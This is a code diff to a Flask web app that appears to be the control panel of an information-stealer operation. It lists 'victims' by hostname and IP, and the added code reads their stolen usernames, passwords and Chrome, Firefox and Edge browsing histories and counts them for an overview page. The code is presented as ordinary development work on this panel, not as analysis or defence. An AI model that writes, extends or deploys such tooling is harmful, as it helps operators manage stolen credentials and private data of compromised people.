@@ -83,9 +83,25 @@ def victim():
     with conn.cursor(DictCursor) as cursor:
         cursor.execute("SELECT username FROM list_admin WHERE username = %s", (username,))
         user_data = cursor.fetchone()
+        
+        # Fetch victim data, using 'created_at' instead of 'start_date'
+        cursor.execute(""" 
+            SELECT t.id, t.username, t.hostname, t.local_ip, t.public_ip, t.created_at
+            FROM system_info t
+            INNER JOIN (
+                SELECT hostname, MAX(created_at) AS max_time
+                FROM system_info
+                GROUP BY hostname
+            ) grouped 
+            ON t.hostname = grouped.hostname AND t.created_at = grouped.max_time
+        """)
+        victim_data = cursor.fetchall()  # Changed from victims to victim_data
+
     conn.close()
 
-    return render_template('victim.html')
+    return render_template('victim.html', user=user_data, victim_data=victim_data)  # Pass victim_data
+
+
 
 @app.route('/settings', methods=['GET', 'POST'])
 def settings():
@@ -121,14 +137,14 @@ def settings():
 def get_victims():
     conn = get_db_connection()
     with conn.cursor(DictCursor) as cursor:
-        cursor.execute("""
-            SELECT t.*
-            FROM system_info t
+        cursor.execute(""" 
+            SELECT t.* 
+            FROM system_info t 
             INNER JOIN (
-                SELECT hostname, MAX(created_at) as max_time
-                FROM system_info
+                SELECT hostname, MAX(created_at) AS max_time 
+                FROM system_info 
                 GROUP BY hostname
-            ) grouped
+            ) grouped 
             ON t.hostname = grouped.hostname AND t.created_at = grouped.max_time
         """)
         victims = cursor.fetchall()
@@ -148,18 +164,29 @@ def overview():
         cursor.execute("SELECT * FROM system_info WHERE id = %s", (victim_id,))
         victim_data = cursor.fetchone()
 
-        cursor.execute("""
-            SELECT packets_sent, packets_recv, created_at
-            FROM system_info
-            WHERE id = %s
-            ORDER BY created_at DESC
+        cursor.execute(""" 
+            SELECT packets_sent, packets_recv, created_at 
+            FROM system_info 
+            WHERE id = %s 
+            ORDER BY created_at DESC 
             LIMIT 5
         """, (victim_id,))
         network_data = cursor.fetchall()
 
+        cursor.execute("SELECT usernames, passwords, chrome_history, firefox_history, edge_history FROM system_info WHERE id = %s", (victim_id,))
+        info = cursor.fetchone()
+
+        total_passwords = 0
+        if info['usernames']:
+            total_passwords = len(info['usernames'].strip().split('\n'))
+        elif info['passwords']:
+            total_passwords = len(info['passwords'].strip().split('\n'))
+
+        total_history = 0
+        for key in ['chrome_history', 'firefox_history', 'edge_history']:
+            if info[key]:
+                total_history += len(info[key].strip().split('\n'))
     conn.close()
-    print("Victim Data:", victim_data)
-    print("Network Data:", network_data)
 
     if victim_data and network_data:
         labels = [row['created_at'].strftime('%Y-%m-%d %H:%M:%S') for row in network_data]
@@ -172,10 +199,13 @@ def overview():
             labels=labels, 
             packets_sent=packets_sent, 
             packets_recv=packets_recv, 
-            scale_factor=1000
+            scale_factor=1000,
+            total_passwords=total_passwords,
+            total_history=total_history
         )
     else:
         return "Network data not found", 404
+
 
 @app.route('/history')
 def history():
@@ -217,7 +247,6 @@ def serve_static(filename):
 def logout():
     session.clear()
     return redirect(url_for('login'))
-
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0')
